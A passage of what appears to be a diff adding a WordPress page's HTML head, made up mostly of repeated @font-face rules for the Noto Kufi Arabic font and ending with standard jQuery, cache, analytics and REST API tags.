U+1F810-1F847, U+1F850-1F859, U+1F860-1F887, U+1F890-1F8AD, U+1F8B0-1F8BB, U+1F8C0-1F8C1, U+1F900-1F90B, U+1F93B, U+1F946, U+1F984, U+1F996, U+1F9E9, U+1FA00-1FA6F, U+1FA70-1FA7C, U+1FA80-1FA89, U+1FA8F-1FAC6, U+1FACE-1FADC, U+1FADF-1FAE9, U+1FAF0-1FAF8, U+1FB00-1FBFF;
+}
+/* latin-ext */
+@font-face {
+  font-family: 'Noto Kufi Arabic';
+  font-style: normal;
+  font-weight: 500;
+  src: url(/fonts.gstatic.com/s/notokufiarabic/v21/CSRk4ydQnPyaDxEXLFF6LZVLKrodrO0FFlKp.woff2) format('woff2');
+  unicode-range: U+0100-02BA, U+02BD-02C5, U+02C7-02CC, U+02CE-02D7, U+02DD-02FF, U+0304, U+0308, U+0329, U+1D00-1DBF, U+1E00-1E9F, U+1EF2-1EFF, U+2020, U+20A0-20AB, U+20AD-20C0, U+2113, U+2C60-2C7F, U+A720-A7FF;
+}
+/* latin */
+@font-face {
+  font-family: 'Noto Kufi Arabic';
+  font-style: normal;
+  font-weight: 500;
+  src: url(/fonts.gstatic.com/s/notokufiarabic/v21/CSRk4ydQnPyaDxEXLFF6LZVLKrodrOMFFg.woff2) format('woff2');
+  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
+}
+/* arabic */
+@font-face {
+  font-family: 'Noto Kufi Arabic';
+  font-style: normal;
+  font-weight: 600;
+  src: url(/fonts.gstatic.com/s/notokufiarabic/v21/CSRk4ydQnPyaDxEXLFF6LZVLKrodrOYFFlKp.woff2) format('woff2');
+  unicode-range: U+0600-06FF, U+0750-077F, U+0870-088E, U+0890-0891, U+0897-08E1, U+08E3-08FF, U+200C-200E, U+2010-2011, U+204F, U+2E41, U+FB50-FDFF, U+FE70-FE74, U+FE76-FEFC, U+102E0-102FB, U+10E60-10E7E, U+10EC2-10EC4, U+10EFC-10EFF, U+1EE00-1EE03, U+1EE05-1EE1F, U+1EE21-1EE22, U+1EE24, U+1EE27, U+1EE29-1EE32, U+1EE34-1EE37, U+1EE39, U+1EE3B, U+1EE42, U+1EE47, U+1EE49, U+1EE4B, U+1EE4D-1EE4F, U+1EE51-1EE52, U+1EE54, U+1EE57, U+1EE59, U+1EE5B, U+1EE5D, U+1EE5F, U+1EE61-1EE62, U+1EE64, U+1EE67-1EE6A, U+1EE6C-1EE72, U+1EE74-1EE77, U+1EE79-1EE7C, U+1EE7E, U+1EE80-1EE89, U+1EE8B-1EE9B, U+1EEA1-1EEA3, U+1EEA5-1EEA9, U+1EEAB-1EEBB, U+1EEF0-1EEF1;
+}
+/* math */
+@font-face {
+  font-family: 'Noto Kufi Arabic';
+  font-style: normal;
+  font-weight: 600;
+  src: url(/fonts.gstatic.com/s/notokufiarabic/v21/CSRk4ydQnPyaDxEXLFF6LZVLKrodrJ8FFlKp.woff2) format('woff2');
+  unicode-range: U+0302-0303, U+0305, U+0307-0308, U+0310, U+0312, U+0315, U+031A, U+0326-0327, U+032C, U+032F-0330, U+0332-0333, U+0338, U+033A, U+0346, U+034D, U+0391-03A1, U+03A3-03A9, U+03B1-03C9, U+03D1, U+03D5-03D6, U+03F0-03F1, U+03F4-03F5, U+2016-2017, U+2034-2038, U+203C, U+2040, U+2043, U+2047, U+2050, U+2057, U+205F, U+2070-2071, U+2074-208E, U+2090-209C, U+20D0-20DC, U+20E1, U+20E5-20EF, U+2100-2112, U+2114-2115, U+2117-2121, U+2123-214F, U+2190, U+2192, U+2194-21AE, U+21B0-21E5, U+21F1-21F2, U+21F4-2211, U+2213-2214, U+2216-22FF, U+2308-230B, U+2310, U+2319, U+231C-2321, U+2336-237A, U+237C, U+2395, U+239B-23B7, U+23D0, U+23DC-23E1, U+2474-2475, U+25AF, U+25B3, U+25B7, U+25BD, U+25C1, U+25CA, U+25CC, U+25FB, U+266D-266F, U+27C0-27FF, U+2900-2AFF, U+2B0E-2B11, U+2B30-2B4C, U+2BFE, U+3030, U+FF5B, U+FF5D, U+1D400-1D7FF, U+1EE00-1EEFF;
+}
+/* symbols */
+@font-face {
+  font-family: 'Noto Kufi Arabic';
+  font-style: normal;
+  font-weight: 600;
+  src: url(/fonts.gstatic.com/s/notokufiarabic/v21/CSRk4ydQnPyaDxEXLFF6LZVLKrodrI0FFlKp.woff2) format('woff2');
+  unicode-range: U+0001-000C, U+000E-001F, U+007F-009F, U+20DD-20E0, U+20E2-20E4, U+2150-218F, U+2190, U+2192, U+2194-2199, U+21AF, U+21E6-21F0, U+21F3, U+2218-2219, U+2299, U+22C4-22C6, U+2300-243F, U+2440-244A, U+2460-24FF, U+25A0-27BF, U+2800-28FF, U+2921-2922, U+2981, U+29BF, U+29EB, U+2B00-2BFF, U+4DC0-4DFF, U+FFF9-FFFB, U+10140-1018E, U+10190-1019C, U+101A0, U+101D0-101FD, U+102E0-102FB, U+10E60-10E7E, U+1D2C0-1D2D3, U+1D2E0-1D37F, U+1F000-1F0FF, U+1F100-1F1AD, U+1F1E6-1F1FF, U+1F30D-1F30F, U+1F315, U+1F31C, U+1F31E, U+1F320-1F32C, U+1F336, U+1F378, U+1F37D, U+1F382, U+1F393-1F39F, U+1F3A7-1F3A8, U+1F3AC-1F3AF, U+1F3C2, U+1F3C4-1F3C6, U+1F3CA-1F3CE, U+1F3D4-1F3E0, U+1F3ED, U+1F3F1-1F3F3, U+1F3F5-1F3F7, U+1F408, U+1F415, U+1F41F, U+1F426, U+1F43F, U+1F441-1F442, U+1F444, U+1F446-1F449, U+1F44C-1F44E, U+1F453, U+1F46A, U+1F47D, U+1F4A3, U+1F4B0, U+1F4B3, U+1F4B9, U+1F4BB, U+1F4BF, U+1F4C8-1F4CB, U+1F4D6, U+1F4DA, U+1F4DF, U+1F4E3-1F4E6, U+1F4EA-1F4ED, U+1F4F7, U+1F4F9-1F4FB, U+1F4FD-1F4FE, U+1F503, U+1F507-1F50B, U+1F50D, U+1F512-1F513, U+1F53E-1F54A, U+1F54F-1F5FA, U+1F610, U+1F650-1F67F, U+1F687, U+1F68D, U+1F691, U+1F694, U+1F698, U+1F6AD, U+1F6B2, U+1F6B9-1F6BA, U+1F6BC, U+1F6C6-1F6CF, U+1F6D3-1F6D7, U+1F6E0-1F6EA, U+1F6F0-1F6F3, U+1F6F7-1F6FC, U+1F700-1F7FF, U+1F800-1F80B, U+1F810-1F847, U+1F850-1F859, U+1F860-1F887, U+1F890-1F8AD, U+1F8B0-1F8BB, U+1F8C0-1F8C1, U+1F900-1F90B, U+1F93B, U+1F946, U+1F984, U+1F996, U+1F9E9, U+1FA00-1FA6F, U+1FA70-1FA7C, U+1FA80-1FA89, U+1FA8F-1FAC6, U+1FACE-1FADC, U+1FADF-1FAE9, U+1FAF0-1FAF8, U+1FB00-1FBFF;
+}
+/* latin-ext */
+@font-face {
+  font-family: 'Noto Kufi Arabic';
+  font-style: normal;
+  font-weight: 600;
+  src: url(/fonts.gstatic.com/s/notokufiarabic/v21/CSRk4ydQnPyaDxEXLFF6LZVLKrodrO0FFlKp.woff2) format('woff2');
+  unicode-range: U+0100-02BA, U+02BD-02C5, U+02C7-02CC, U+02CE-02D7, U+02DD-02FF, U+0304, U+0308, U+0329, U+1D00-1DBF, U+1E00-1E9F, U+1EF2-1EFF, U+2020, U+20A0-20AB, U+20AD-20C0, U+2113, U+2C60-2C7F, U+A720-A7FF;
+}
+/* latin */
+@font-face {
+  font-family: 'Noto Kufi Arabic';
+  font-style: normal;
+  font-weight: 600;
+  src: url(/fonts.gstatic.com/s/notokufiarabic/v21/CSRk4ydQnPyaDxEXLFF6LZVLKrodrOMFFg.woff2) format('woff2');
+  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
+}
+/* arabic */
+@font-face {
+  font-family: 'Noto Kufi Arabic';
+  font-style: normal;
+  font-weight: 700;
+  src: url(/fonts.gstatic.com/s/notokufiarabic/v21/CSRk4ydQnPyaDxEXLFF6LZVLKrodrOYFFlKp.woff2) format('woff2');
+  unicode-range: U+0600-06FF, U+0750-077F, U+0870-088E, U+0890-0891, U+0897-08E1, U+08E3-08FF, U+200C-200E, U+2010-2011, U+204F, U+2E41, U+FB50-FDFF, U+FE70-FE74, U+FE76-FEFC, U+102E0-102FB, U+10E60-10E7E, U+10EC2-10EC4, U+10EFC-10EFF, U+1EE00-1EE03, U+1EE05-1EE1F, U+1EE21-1EE22, U+1EE24, U+1EE27, U+1EE29-1EE32, U+1EE34-1EE37, U+1EE39, U+1EE3B, U+1EE42, U+1EE47, U+1EE49, U+1EE4B, U+1EE4D-1EE4F, U+1EE51-1EE52, U+1EE54, U+1EE57, U+1EE59, U+1EE5B, U+1EE5D, U+1EE5F, U+1EE61-1EE62, U+1EE64, U+1EE67-1EE6A, U+1EE6C-1EE72, U+1EE74-1EE77, U+1EE79-1EE7C, U+1EE7E, U+1EE80-1EE89, U+1EE8B-1EE9B, U+1EEA1-1EEA3, U+1EEA5-1EEA9, U+1EEAB-1EEBB, U+1EEF0-1EEF1;
+}
+/* math */
+@font-face {
+  font-family: 'Noto Kufi Arabic';
+  font-style: normal;
+  font-weight: 700;
+  src: url(/fonts.gstatic.com/s/notokufiarabic/v21/CSRk4ydQnPyaDxEXLFF6LZVLKrodrJ8FFlKp.woff2) format('woff2');
+  unicode-range: U+0302-0303, U+0305, U+0307-0308, U+0310, U+0312, U+0315, U+031A, U+0326-0327, U+032C, U+032F-0330, U+0332-0333, U+0338, U+033A, U+0346, U+034D, U+0391-03A1, U+03A3-03A9, U+03B1-03C9, U+03D1, U+03D5-03D6, U+03F0-03F1, U+03F4-03F5, U+2016-2017, U+2034-2038, U+203C, U+2040, U+2043, U+2047, U+2050, U+2057, U+205F, U+2070-2071, U+2074-208E, U+2090-209C, U+20D0-20DC, U+20E1, U+20E5-20EF, U+2100-2112, U+2114-2115, U+2117-2121, U+2123-214F, U+2190, U+2192, U+2194-21AE, U+21B0-21E5, U+21F1-21F2, U+21F4-2211, U+2213-2214, U+2216-22FF, U+2308-230B, U+2310, U+2319, U+231C-2321, U+2336-237A, U+237C, U+2395, U+239B-23B7, U+23D0, U+23DC-23E1, U+2474-2475, U+25AF, U+25B3, U+25B7, U+25BD, U+25C1, U+25CA, U+25CC, U+25FB, U+266D-266F, U+27C0-27FF, U+2900-2AFF, U+2B0E-2B11, U+2B30-2B4C, U+2BFE, U+3030, U+FF5B, U+FF5D, U+1D400-1D7FF, U+1EE00-1EEFF;
+}
+/* symbols */
+@font-face {
+  font-family: 'Noto Kufi Arabic';
+  font-style: normal;
+  font-weight: 700;
+  src: url(/fonts.gstatic.com/s/notokufiarabic/v21/CSRk4ydQnPyaDxEXLFF6LZVLKrodrI0FFlKp.woff2) format('woff2');
+  unicode-range: U+0001-000C, U+000E-001F, U+007F-009F, U+20DD-20E0, U+20E2-20E4, U+2150-218F, U+2190, U+2192, U+2194-2199, U+21AF, U+21E6-21F0, U+21F3, U+2218-2219, U+2299, U+22C4-22C6, U+2300-243F, U+2440-244A, U+2460-24FF, U+25A0-27BF, U+2800-28FF, U+2921-2922, U+2981, U+29BF, U+29EB, U+2B00-2BFF, U+4DC0-4DFF, U+FFF9-FFFB, U+10140-1018E, U+10190-1019C, U+101A0, U+101D0-101FD, U+102E0-102FB, U+10E60-10E7E, U+1D2C0-1D2D3, U+1D2E0-1D37F, U+1F000-1F0FF, U+1F100-1F1AD, U+1F1E6-1F1FF, U+1F30D-1F30F, U+1F315, U+1F31C, U+1F31E, U+1F320-1F32C, U+1F336, U+1F378, U+1F37D, U+1F382, U+1F393-1F39F, U+1F3A7-1F3A8, U+1F3AC-1F3AF, U+1F3C2, U+1F3C4-1F3C6, U+1F3CA-1F3CE, U+1F3D4-1F3E0, U+1F3ED, U+1F3F1-1F3F3, U+1F3F5-1F3F7, U+1F408, U+1F415, U+1F41F, U+1F426, U+1F43F, U+1F441-1F442, U+1F444, U+1F446-1F449, U+1F44C-1F44E, U+1F453, U+1F46A, U+1F47D, U+1F4A3, U+1F4B0, U+1F4B3, U+1F4B9, U+1F4BB, U+1F4BF, U+1F4C8-1F4CB, U+1F4D6, U+1F4DA, U+1F4DF, U+1F4E3-1F4E6, U+1F4EA-1F4ED, U+1F4F7, U+1F4F9-1F4FB, U+1F4FD-1F4FE, U+1F503, U+1F507-1F50B, U+1F50D, U+1F512-1F513, U+1F53E-1F54A, U+1F54F-1F5FA, U+1F610, U+1F650-1F67F, U+1F687, U+1F68D, U+1F691, U+1F694, U+1F698, U+1F6AD, U+1F6B2, U+1F6B9-1F6BA, U+1F6BC, U+1F6C6-1F6CF, U+1F6D3-1F6D7, U+1F6E0-1F6EA, U+1F6F0-1F6F3, U+1F6F7-1F6FC, U+1F700-1F7FF, U+1F800-1F80B, U+1F810-1F847, U+1F850-1F859, U+1F860-1F887, U+1F890-1F8AD, U+1F8B0-1F8BB, U+1F8C0-1F8C1, U+1F900-1F90B, U+1F93B, U+1F946, U+1F984, U+1F996, U+1F9E9, U+1FA00-1FA6F, U+1FA70-1FA7C, U+1FA80-1FA89, U+1FA8F-1FAC6, U+1FACE-1FADC, U+1FADF-1FAE9, U+1FAF0-1FAF8, U+1FB00-1FBFF;
+}
+/* latin-ext */
+@font-face {
+  font-family: 'Noto Kufi Arabic';
+  font-style: normal;
+  font-weight: 700;
+  src: url(/fonts.gstatic.com/s/notokufiarabic/v21/CSRk4ydQnPyaDxEXLFF6LZVLKrodrO0FFlKp.woff2) format('woff2');
+  unicode-range: U+0100-02BA, U+02BD-02C5, U+02C7-02CC, U+02CE-02D7, U+02DD-02FF, U+0304, U+0308, U+0329, U+1D00-1DBF, U+1E00-1E9F, U+1EF2-1EFF, U+2020, U+20A0-20AB, U+20AD-20C0, U+2113, U+2C60-2C7F, U+A720-A7FF;
+}
+/* latin */
+@font-face {
+  font-family: 'Noto Kufi Arabic';
+  font-style: normal;
+  font-weight: 700;
+  src: url(/fonts.gstatic.com/s/notokufiarabic/v21/CSRk4ydQnPyaDxEXLFF6LZVLKrodrOMFFg.woff2) format('woff2');
+  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
+}
+/* arabic */
+@font-face {
+  font-family: 'Noto Kufi Arabic';
+  font-style: normal;
+  font-weight: 800;
+  src: url(/fonts.gstatic.com/s/notokufiarabic/v21/CSRk4ydQnPyaDxEXLFF6LZVLKrodrOYFFlKp.woff2) format('woff2');
+  unicode-range: U+0600-06FF, U+0750-077F, U+0870-088E, U+0890-0891, U+0897-08E1, U+08E3-08FF, U+200C-200E, U+2010-2011, U+204F, U+2E41, U+FB50-FDFF, U+FE70-FE74, U+FE76-FEFC, U+102E0-102FB, U+10E60-10E7E, U+10EC2-10EC4, U+10EFC-10EFF, U+1EE00-1EE03, U+1EE05-1EE1F, U+1EE21-1EE22, U+1EE24, U+1EE27, U+1EE29-1EE32, U+1EE34-1EE37, U+1EE39, U+1EE3B, U+1EE42, U+1EE47, U+1EE49, U+1EE4B, U+1EE4D-1EE4F, U+1EE51-1EE52, U+1EE54, U+1EE57, U+1EE59, U+1EE5B, U+1EE5D, U+1EE5F, U+1EE61-1EE62, U+1EE64, U+1EE67-1EE6A, U+1EE6C-1EE72, U+1EE74-1EE77, U+1EE79-1EE7C, U+1EE7E, U+1EE80-1EE89, U+1EE8B-1EE9B, U+1EEA1-1EEA3, U+1EEA5-1EEA9, U+1EEAB-1EEBB, U+1EEF0-1EEF1;
+}
+/* math */
+@font-face {
+  font-family: 'Noto Kufi Arabic';
+  font-style: normal;
+  font-weight: 800;
+  src: url(/fonts.gstatic.com/s/notokufiarabic/v21/CSRk4ydQnPyaDxEXLFF6LZVLKrodrJ8FFlKp.woff2) format('woff2');
+  unicode-range: U+0302-0303, U+0305, U+0307-0308, U+0310, U+0312, U+0315, U+031A, U+0326-0327, U+032C, U+032F-0330, U+0332-0333, U+0338, U+033A, U+0346, U+034D, U+0391-03A1, U+03A3-03A9, U+03B1-03C9, U+03D1, U+03D5-03D6, U+03F0-03F1, U+03F4-03F5, U+2016-2017, U+2034-2038, U+203C, U+2040, U+2043, U+2047, U+2050, U+2057, U+205F, U+2070-2071, U+2074-208E, U+2090-209C, U+20D0-20DC, U+20E1, U+20E5-20EF, U+2100-2112, U+2114-2115, U+2117-2121, U+2123-214F, U+2190, U+2192, U+2194-21AE, U+21B0-21E5, U+21F1-21F2, U+21F4-2211, U+2213-2214, U+2216-22FF, U+2308-230B, U+2310, U+2319, U+231C-2321, U+2336-237A, U+237C, U+2395, U+239B-23B7, U+23D0, U+23DC-23E1, U+2474-2475, U+25AF, U+25B3, U+25B7, U+25BD, U+25C1, U+25CA, U+25CC, U+25FB, U+266D-266F, U+27C0-27FF, U+2900-2AFF, U+2B0E-2B11, U+2B30-2B4C, U+2BFE, U+3030, U+FF5B, U+FF5D, U+1D400-1D7FF, U+1EE00-1EEFF;
+}
+/* symbols */
+@font-face {
+  font-family: 'Noto Kufi Arabic';
+  font-style: normal;
+  font-weight: 800;
+  src: url(/fonts.gstatic.com/s/notokufiarabic/v21/CSRk4ydQnPyaDxEXLFF6LZVLKrodrI0FFlKp.woff2) format('woff2');
+  unicode-range: U+0001-000C, U+000E-001F, U+007F-009F, U+20DD-20E0, U+20E2-20E4, U+2150-218F, U+2190, U+2192, U+2194-2199, U+21AF, U+21E6-21F0, U+21F3, U+2218-2219, U+2299, U+22C4-22C6, U+2300-243F, U+2440-244A, U+2460-24FF, U+25A0-27BF, U+2800-28FF, U+2921-2922, U+2981, U+29BF, U+29EB, U+2B00-2BFF, U+4DC0-4DFF, U+FFF9-FFFB, U+10140-1018E, U+10190-1019C, U+101A0, U+101D0-101FD, U+102E0-102FB, U+10E60-10E7E, U+1D2C0-1D2D3, U+1D2E0-1D37F, U+1F000-1F0FF, U+1F100-1F1AD, U+1F1E6-1F1FF, U+1F30D-1F30F, U+1F315, U+1F31C, U+1F31E, U+1F320-1F32C, U+1F336, U+1F378, U+1F37D, U+1F382, U+1F393-1F39F, U+1F3A7-1F3A8, U+1F3AC-1F3AF, U+1F3C2, U+1F3C4-1F3C6, U+1F3CA-1F3CE, U+1F3D4-1F3E0, U+1F3ED, U+1F3F1-1F3F3, U+1F3F5-1F3F7, U+1F408, U+1F415, U+1F41F, U+1F426, U+1F43F, U+1F441-1F442, U+1F444, U+1F446-1F449, U+1F44C-1F44E, U+1F453, U+1F46A, U+1F47D, U+1F4A3, U+1F4B0, U+1F4B3, U+1F4B9, U+1F4BB, U+1F4BF, U+1F4C8-1F4CB, U+1F4D6, U+1F4DA, U+1F4DF, U+1F4E3-1F4E6, U+1F4EA-1F4ED, U+1F4F7, U+1F4F9-1F4FB, U+1F4FD-1F4FE, U+1F503, U+1F507-1F50B, U+1F50D, U+1F512-1F513, U+1F53E-1F54A, U+1F54F-1F5FA, U+1F610, U+1F650-1F67F, U+1F687, U+1F68D, U+1F691, U+1F694, U+1F698, U+1F6AD, U+1F6B2, U+1F6B9-1F6BA, U+1F6BC, U+1F6C6-1F6CF, U+1F6D3-1F6D7, U+1F6E0-1F6EA, U+1F6F0-1F6F3, U+1F6F7-1F6FC, U+1F700-1F7FF, U+1F800-1F80B, U+1F810-1F847, U+1F850-1F859, U+1F860-1F887, U+1F890-1F8AD, U+1F8B0-1F8BB, U+1F8C0-1F8C1, U+1F900-1F90B, U+1F93B, U+1F946, U+1F984, U+1F996, U+1F9E9, U+1FA00-1FA6F, U+1FA70-1FA7C, U+1FA80-1FA89, U+1FA8F-1FAC6, U+1FACE-1FADC, U+1FADF-1FAE9, U+1FAF0-1FAF8, U+1FB00-1FBFF;
+}
+/* latin-ext */
+@font-face {
+  font-family: 'Noto Kufi Arabic';
+  font-style: normal;
+  font-weight: 800;
+  src: url(/fonts.gstatic.com/s/notokufiarabic/v21/CSRk4ydQnPyaDxEXLFF6LZVLKrodrO0FFlKp.woff2) format('woff2');
+  unicode-range: U+0100-02BA, U+02BD-02C5, U+02C7-02CC, U+02CE-02D7, U+02DD-02FF, U+0304, U+0308, U+0329, U+1D00-1DBF, U+1E00-1E9F, U+1EF2-1EFF, U+2020, U+20A0-20AB, U+20AD-20C0, U+2113, U+2C60-2C7F, U+A720-A7FF;
+}
+/* latin */
+@font-face {
+  font-family: 'Noto Kufi Arabic';
+  font-style: normal;
+  font-weight: 800;
+  src: url(/fonts.gstatic.com/s/notokufiarabic/v21/CSRk4ydQnPyaDxEXLFF6LZVLKrodrOMFFg.woff2) format('woff2');
+  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
+}
+/* arabic */
+@font-face {
+  font-family: 'Noto Kufi Arabic';
+  font-style: normal;
+  font-weight: 900;
+  src: url(/fonts.gstatic.com/s/notokufiarabic/v21/CSRk4ydQnPyaDxEXLFF6LZVLKrodrOYFFlKp.woff2) format('woff2');
+  unicode-range: U+0600-06FF, U+0750-077F, U+0870-088E, U+0890-0891, U+0897-08E1, U+08E3-08FF, U+200C-200E, U+2010-2011, U+204F, U+2E41, U+FB50-FDFF, U+FE70-FE74, U+FE76-FEFC, U+102E0-102FB, U+10E60-10E7E, U+10EC2-10EC4, U+10EFC-10EFF, U+1EE00-1EE03, U+1EE05-1EE1F, U+1EE21-1EE22, U+1EE24, U+1EE27, U+1EE29-1EE32, U+1EE34-1EE37, U+1EE39, U+1EE3B, U+1EE42, U+1EE47, U+1EE49, U+1EE4B, U+1EE4D-1EE4F, U+1EE51-1EE52, U+1EE54, U+1EE57, U+1EE59, U+1EE5B, U+1EE5D, U+1EE5F, U+1EE61-1EE62, U+1EE64, U+1EE67-1EE6A, U+1EE6C-1EE72, U+1EE74-1EE77, U+1EE79-1EE7C, U+1EE7E, U+1EE80-1EE89, U+1EE8B-1EE9B, U+1EEA1-1EEA3, U+1EEA5-1EEA9, U+1EEAB-1EEBB, U+1EEF0-1EEF1;
+}
+/* math */
+@font-face {
+  font-family: 'Noto Kufi Arabic';
+  font-style: normal;
+  font-weight: 900;
+  src: url(/fonts.gstatic.com/s/notokufiarabic/v21/CSRk4ydQnPyaDxEXLFF6LZVLKrodrJ8FFlKp.woff2) format('woff2');
+  unicode-range: U+0302-0303, U+0305, U+0307-0308, U+0310, U+0312, U+0315, U+031A, U+0326-0327, U+032C, U+032F-0330, U+0332-0333, U+0338, U+033A, U+0346, U+034D, U+0391-03A1, U+03A3-03A9, U+03B1-03C9, U+03D1, U+03D5-03D6, U+03F0-03F1, U+03F4-03F5, U+2016-2017, U+2034-2038, U+203C, U+2040, U+2043, U+2047, U+2050, U+2057, U+205F, U+2070-2071, U+2074-208E, U+2090-209C, U+20D0-20DC, U+20E1, U+20E5-20EF, U+2100-2112, U+2114-2115, U+2117-2121, U+2123-214F, U+2190, U+2192, U+2194-21AE, U+21B0-21E5, U+21F1-21F2, U+21F4-2211, U+2213-2214, U+2216-22FF, U+2308-230B, U+2310, U+2319, U+231C-2321, U+2336-237A, U+237C, U+2395, U+239B-23B7, U+23D0, U+23DC-23E1, U+2474-2475, U+25AF, U+25B3, U+25B7, U+25BD, U+25C1, U+25CA, U+25CC, U+25FB, U+266D-266F, U+27C0-27FF, U+2900-2AFF, U+2B0E-2B11, U+2B30-2B4C, U+2BFE, U+3030, U+FF5B, U+FF5D, U+1D400-1D7FF, U+1EE00-1EEFF;
+}
+/* symbols */
+@font-face {
+  font-family: 'Noto Kufi Arabic';
+  font-style: normal;
+  font-weight: 900;
+  src: url(/fonts.gstatic.com/s/notokufiarabic/v21/CSRk4ydQnPyaDxEXLFF6LZVLKrodrI0FFlKp.woff2) format('woff2');
+  unicode-range: U+0001-000C, U+000E-001F, U+007F-009F, U+20DD-20E0, U+20E2-20E4, U+2150-218F, U+2190, U+2192, U+2194-2199, U+21AF, U+21E6-21F0, U+21F3, U+2218-2219, U+2299, U+22C4-22C6, U+2300-243F, U+2440-244A, U+2460-24FF, U+25A0-27BF, U+2800-28FF, U+2921-2922, U+2981, U+29BF, U+29EB, U+2B00-2BFF, U+4DC0-4DFF, U+FFF9-FFFB, U+10140-1018E, U+10190-1019C, U+101A0, U+101D0-101FD, U+102E0-102FB, U+10E60-10E7E, U+1D2C0-1D2D3, U+1D2E0-1D37F, U+1F000-1F0FF, U+1F100-1F1AD, U+1F1E6-1F1FF, U+1F30D-1F30F, U+1F315, U+1F31C, U+1F31E, U+1F320-1F32C, U+1F336, U+1F378, U+1F37D, U+1F382, U+1F393-1F39F, U+1F3A7-1F3A8, U+1F3AC-1F3AF, U+1F3C2, U+1F3C4-1F3C6, U+1F3CA-1F3CE, U+1F3D4-1F3E0, U+1F3ED, U+1F3F1-1F3F3, U+1F3F5-1F3F7, U+1F408, U+1F415, U+1F41F, U+1F426, U+1F43F, U+1F441-1F442, U+1F444, U+1F446-1F449, U+1F44C-1F44E, U+1F453, U+1F46A, U+1F47D, U+1F4A3, U+1F4B0, U+1F4B3, U+1F4B9, U+1F4BB, U+1F4BF, U+1F4C8-1F4CB, U+1F4D6, U+1F4DA, U+1F4DF, U+1F4E3-1F4E6, U+1F4EA-1F4ED, U+1F4F7, U+1F4F9-1F4FB, U+1F4FD-1F4FE, U+1F503, U+1F507-1F50B, U+1F50D, U+1F512-1F513, U+1F53E-1F54A, U+1F54F-1F5FA, U+1F610, U+1F650-1F67F, U+1F687, U+1F68D, U+1F691, U+1F694, U+1F698, U+1F6AD, U+1F6B2, U+1F6B9-1F6BA, U+1F6BC, U+1F6C6-1F6CF, U+1F6D3-1F6D7, U+1F6E0-1F6EA, U+1F6F0-1F6F3, U+1F6F7-1F6FC, U+1F700-1F7FF, U+1F800-1F80B, U+1F810-1F847, U+1F850-1F859, U+1F860-1F887, U+1F890-1F8AD, U+1F8B0-1F8BB, U+1F8C0-1F8C1, U+1F900-1F90B, U+1F93B, U+1F946, U+1F984, U+1F996, U+1F9E9, U+1FA00-1FA6F, U+1FA70-1FA7C, U+1FA80-1FA89, U+1FA8F-1FAC6, U+1FACE-1FADC, U+1FADF-1FAE9, U+1FAF0-1FAF8, U+1FB00-1FBFF;
+}
+/* latin-ext */
+@font-face {
+  font-family: 'Noto Kufi Arabic';
+  font-style: normal;
+  font-weight: 900;
+  src: url(/fonts.gstatic.com/s/notokufiarabic/v21/CSRk4ydQnPyaDxEXLFF6LZVLKrodrO0FFlKp.woff2) format('woff2');
+  unicode-range: U+0100-02BA, U+02BD-02C5, U+02C7-02CC, U+02CE-02D7, U+02DD-02FF, U+0304, U+0308, U+0329, U+1D00-1DBF, U+1E00-1E9F, U+1EF2-1EFF, U+2020, U+20A0-20AB, U+20AD-20C0, U+2113, U+2C60-2C7F, U+A720-A7FF;
+}
+/* latin */
+@font-face {
+  font-family: 'Noto Kufi Arabic';
+  font-style: normal;
+  font-weight: 900;
+  src: url(/fonts.gstatic.com/s/notokufiarabic/v21/CSRk4ydQnPyaDxEXLFF6LZVLKrodrOMFFg.woff2) format('woff2');
+  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
+}
+</style>
+<script type="text/javascript" src="https://c0.wp.com/c/6.7.1/wp-includes/js/jquery/jquery.min.js" id="jquery-core-js"></script>
+<script type="text/javascript" src="https://c0.wp.com/c/6.7.1/wp-includes/js/jquery/jquery-migrate.min.js" id="jquery-migrate-js"></script>
+<script src='//www.achkayen.com/wp-content/cache/wpfc-minified/dib2qhfa/88gyx.js' type="text/javascript"></script>
+<!-- <script type="text/javascript" src="https://www.achkayen.com/wp-content/plugins/google-analytics-premium/assets/js/frontend-gtag.min.js?ver=9.2.4" id="monsterinsights-frontend-script-js" async="async" data-wp-strategy="async"></script> -->
+<script data-cfasync="false" data-wpfc-render="false" type="text/javascript" id='monsterinsights-frontend-script-js-extra'>/* <![CDATA[ */
+var monsterinsights_frontend = {"js_events_tracking":"true","download_extensions":"doc,pdf,ppt,zip,xls,docx,pptx,xlsx","inbound_paths":"[{\"path\":\"\\\/go\\\/\",\"label\":\"affiliate\"},{\"path\":\"\\\/recommend\\\/\",\"label\":\"affiliate\"}]","home_url":"https:\/\/www.achkayen.com","hash_tracking":"false","v4_id":"G-123DG6L8ZX"};/* ]]> */
+</script>
+<!--[if lt IE 9]>
+<script type="text/javascript" src="https://www.achkayen.com/wp-content/themes/publisher/includes/libs/better-framework/assets/js/html5shiv.min.js?ver=3.15.0" id="bf-html5shiv-js"></script>
+<![endif]-->
+<!--[if lt IE 9]>
+<script type="text/javascript" src="https://www.achkayen.com/wp-content/themes/publisher/includes/libs/better-framework/assets/js/respond.min.js?ver=3.15.0" id="bf-respond-js"></script>
+<![endif]-->
+<link rel="https://api.w.org/" href="https://www.achkayen.com/wp-json/" /><link rel="alternate" title="JSON" type="application/json" href="https://www.achkayen.com/wp-json/wp/v2/pages/119" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://www.achkayen.com/xmlrpc.php?rsd" />
